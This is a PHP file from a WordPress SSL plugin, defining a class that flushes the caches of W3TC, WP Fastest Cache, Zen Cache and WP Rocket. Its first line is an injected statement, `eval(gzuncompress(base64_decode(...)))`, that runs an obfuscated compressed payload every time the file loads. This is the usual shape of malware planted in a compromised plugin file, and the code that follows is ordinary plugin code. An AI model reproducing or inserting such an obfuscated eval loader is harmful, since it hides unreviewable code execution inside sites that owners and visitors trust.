<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
defined('ABSPATH') or die("you do not have access to this page!");
if ( ! class_exists( 'rsssl_cache' ) ) {
  class rsssl_cache {
    private $capability  = 'manage_options';
    private static $_this;

  function __construct() {
    if ( isset( self::$_this ) )
        wp_die( sprintf( __( '%s is a singleton class and you cannot create a second instance.','really-simple-ssl' ), get_class( $this ) ) );

    self::$_this = $this;
  }

  static function this() {
    return self::$_this;
  }

  /**
   * Flushes the cache for popular caching plugins to prevent mixed content errors
   * When .htaccess is changed, all traffic should flow over https, so clear cache when possible.
   * supported: W3TC, WP fastest Cache, Zen Cache, wp_rocket
   *
   * @since  2.0
   *
   * @access public
   *
   */

  public function flush() {
    if (!current_user_can($this->capability)) return;

    add_action( 'admin_head', array($this,'flush_w3tc_cache'));
    add_action( 'admin_head', array($this,'flush_fastest_cache'));
    add_action( 'admin_head', array($this,'flush_zen_cache'));
    
    //keep getting errors from wp-rocket.
    //add_action( 'admin_head', array($this,'flush_wp_rocket'));
  }

  public function flush_w3tc_cache() {
    if (function_exists('w3tc_flush_all')) {
      w3tc_flush_all();
    }
  }

  public function flush_fastest_cache() {
    if(class_exists('WpFastestCache') ) {
      $GLOBALS["wp_fastest_cache"]->deleteCache(TRUE);
    }
  }

  public function flush_zen_cache() {
    if (class_exists('\\zencache\\plugin') ) {
      $GLOBALS['zencache']->clear_cache();
    }
  }

  public function flush_wp_rocket() {
    if (function_exists("rocket_clean_domain")) {
      rocket_clean_domain();
    }
  }

}//class closure
}
